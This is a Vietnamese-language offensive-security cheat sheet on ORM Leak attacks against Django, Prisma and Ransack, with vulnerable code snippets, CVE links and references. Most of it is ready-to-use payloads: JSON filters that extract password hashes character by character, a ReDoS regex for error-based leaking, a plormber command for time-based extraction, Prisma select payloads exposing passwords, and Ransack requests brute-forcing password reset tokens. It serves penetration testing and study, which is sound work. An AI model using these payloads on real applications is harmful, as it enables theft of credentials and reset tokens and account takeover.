# ORM Leak

> Lỗ hổng ORM Leak xảy ra khi các thông tin nhạy cảm, chẳng hạn như cấu trúc cơ sở dữ liệu hoặc dữ liệu người dùng, vô tình bị tiết lộ do xử lý các truy vấn ORM không đúng cách. Điều này có thể xảy ra khi ứng dụng trả về thông báo lỗi thô, thông tin debug hoặc cho phép kẻ tấn công thao túng truy vấn theo những cách làm lộ dữ liệu bên dưới.

## Tóm tắt

* [Django (Python)](#django-python)

  * [Bộ lọc truy vấn](#query-filter)
  * [Lọc quan hệ](#relational-filtering)

    * [One-to-One](#one-to-one)
    * [Many-to-Many](#many-to-many)
  * [Rò rỉ dựa trên lỗi - ReDOS](#error-based-leaking---redos)
* [Prisma (Node.JS)](#prisma-nodejs)

  * [Lọc quan hệ](#relational-filtering-1)

    * [One-to-One](#one-to-one-1)
    * [Many-to-Many](#many-to-many-1)
* [Ransack (Ruby)](#ransack-ruby)
* [CVE](#cve)
* [Tài liệu tham khảo](#references)

## Django (Python)

Đoạn code sau là một ví dụ cơ bản về ORM thực hiện truy vấn cơ sở dữ liệu.

```py
users = User.objects.filter(**request.data)
serializer = UserSerializer(users, many=True)
```

Vấn đề nằm ở cách Django ORM sử dụng cú pháp tham số keyword để xây dựng QuerySet. Bằng cách sử dụng toán tử unpack (`**`), người dùng có thể kiểm soát động các keyword argument được truyền vào phương thức `filter`, cho phép họ lọc kết quả theo nhu cầu.

### Bộ lọc truy vấn

Kẻ tấn công có thể kiểm soát cột được sử dụng để lọc kết quả.

ORM cung cấp các operator để so khớp một phần của giá trị. Các operator này có thể sử dụng điều kiện SQL `LIKE` trong các truy vấn được tạo ra, thực hiện so khớp regex dựa trên pattern do người dùng kiểm soát hoặc áp dụng các toán tử so sánh như `<` và `>`.

```json
{
  "username": "admin",
  "password__startswith": "p"
}
```

Các bộ lọc đáng chú ý:

* `__startswith`
* `__contains`
* `__regex`

### Lọc quan hệ

Hãy sử dụng ví dụ này từ [PLORMBING YOUR DJANGO ORM, by Alex Brown](https://www.elttam.com/blog/plormbing-your-django-orm/)

![UML-example-app-simplified-highlight](https://cdn.prod.website-files.com/6971f0e051b588235e8acf7b/69c28ab386b7948b108ecc8b_69b98986947782073459457e_UML-example-app-simplified-highlight1.avif)

Có thể thấy 2 loại quan hệ:

* Quan hệ One-to-One
* Quan hệ Many-to-Many

#### One-to-One

Lọc thông qua user đã tạo một article và kiểm tra xem password có chứa ký tự `p` hay không.

```json
{
  "created_by__user__password__contains": "p"
}
```

#### Many-to-Many

Gần giống trường hợp trên nhưng cần thực hiện lọc nhiều hơn.

* Lấy ID của user: `created_by__departments__employees__user__id`
* Với mỗi ID, lấy username: `created_by__departments__employees__user__username`
* Cuối cùng, làm rò rỉ password hash của họ: `created_by__departments__employees__user__password`

Sử dụng nhiều bộ lọc trong cùng một request:

```json
{
  "created_by__departments__employees__user__username__startswith": "p",
  "created_by__departments__employees__user__id": 1
}
```

### Rò rỉ dựa trên lỗi - ReDOS

Nếu Django sử dụng MySQL, cũng có thể lợi dụng ReDOS để buộc ứng dụng tạo lỗi khi bộ lọc không khớp chính xác với điều kiện.

```json
{"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"}
// => Trả về kết quả

{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}  
// => Lỗi 500 (Timeout exceeded in regular expression match)
```

## Prisma (Node.JS)

**Công cụ**:

* https://github.com/elttam/plormber - công cụ khai thác các lỗ hổng ORM Leak dựa trên thời gian

  ```ps1
  plormber prisma-contains \
      --chars '0123456789abcdef' \
      --base-query-json '{"query": {PAYLOAD}}' \
      --leak-query-json '{"createdBy": {"resetToken": {"startsWith": "{ORM_LEAK}"}}}' \
      --contains-payload-json '{"body": {"contains": "{RANDOM_STRING}"}}' \
      --verbose-stats \
      https://some.vuln.app/articles/time-based;
  ```

**Ví dụ**:

Ví dụ về ORM Leak trong Node.JS với Prisma.

```js
const posts = await prisma.article.findMany({
  where: req.query.filter as any // Dễ bị ORM Leak
})
```

Sử dụng `include` để trả về tất cả các trường của user record đã tạo article:

```json
{
  "filter": {
    "include": {
      "createdBy": true
    }
  }
}
```

Chỉ chọn một trường:

```json
{
  "filter": {
    "select": {
      "createdBy": {
        "select": {
          "password": true
        }
      }
    }
  }
}
```

### Lọc quan hệ

#### One-to-One

* [`filter[createdBy][resetToken][startsWith]=06`](http://127.0.0.1:9900/articles?filter[createdBy][resetToken][startsWith]=)

#### Many-to-Many

```json
{
  "query": {
    "createdBy": {
      "departments": {
        "some": {
          "employees": {
            "some": {
              "departments": {
                "some": {
                  "employees": {
                    "some": {
                      "departments": {
                        "some": {
                          "employees": {
                            "some": {
                              "{fieldToLeak}": {
                                "startsWith": "{testStartsWith}"
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

## Ransack (Ruby)

Chỉ áp dụng với Ransack < `4.0.0`.

![ransack\_bruteforce\_overview](https://assets-global.website-files.com/5f6498c074436c349716e747/63ceda8f7b5b98d68365bdee_ransack_bruteforce_overview-p-1600.png)

* Trích xuất trường `reset_password_token` của một user:

  ```ps1
  GET /posts?q[user_reset_password_token_start]=0 -> Trang kết quả trống
  GET /posts?q[user_reset_password_token_start]=1 -> Trang kết quả trống
  GET /posts?q[user_reset_password_token_start]=2 -> Có kết quả trên trang

  GET /posts?q[user_reset_password_token_start]=2c -> Trang kết quả trống
  GET /posts?q[user_reset_password_token_start]=2f -> Có kết quả trên trang
  ```

* Nhắm đến một user cụ thể và trích xuất `recoveries_key` của user đó:

  ```ps1
  GET /labs?q[creator_roles_name_cont]=​superadmin​​&q[creator_recoveries_key_start]=0
  ```

## CVE

* [CVE-2023-47117: Label Studio ORM Leak](https://github.com/HumanSignal/label-studio/security/advisories/GHSA-6hjj-gq77-j4qw)
* [CVE-2023-31133: Ghost CMS ORM Leak](https://github.com/TryGhost/Ghost/security/advisories/GHSA-r97q-ghch-82j9)
* [CVE-2023-30843: Payload CMS ORM Leak](https://github.com/payloadcms/payload/security/advisories/GHSA-35jj-vqcf-f2jf)

## Tài liệu tham khảo

* [ORM Injection - HackTricks - July 30, 2024](https://web.archive.org/web/20241230091620/https://book.hacktricks.xyz/pentesting-web/orm-injection)
* [ORM Leak Exploitation Against SQLite - Louis Nyffenegger - July 30, 2024](https://web.archive.org/web/20260118225011/https://pentesterlab.com/blog/orm-leak-with-sqlite3)
* [ORM Leaking More Than You Joined For - Alex Brown - December 18, 2025](https://web.archive.org/web/20251218130815/https://www.elttam.com/blog/leaking-more-than-you-joined-for/)
* [plORMbing your Django ORM - Alex Brown - June 24, 2024](https://web.archive.org/web/20240624071414/https://www.elttam.com/blog/plormbing-your-django-orm/)
* [plORMbing your Prisma ORM with Time-based Attacks - Alex Brown - July 9, 2024](https://web.archive.org/web/20240709043351/https://www.elttam.com/blog/plorming-your-primsa-orm/)
* [QuerySet API reference - Django - August 8, 2024](https://web.archive.org/web/20240625055642/https://docs.djangoproject.com/en/5.1/ref/models/querysets/)
* [Ransacking your password reset tokens - Lukas Euler - January 26, 2023](https://web.archive.org/web/20251211204930/https://positive.security/blog/ransack-data-exfiltration)
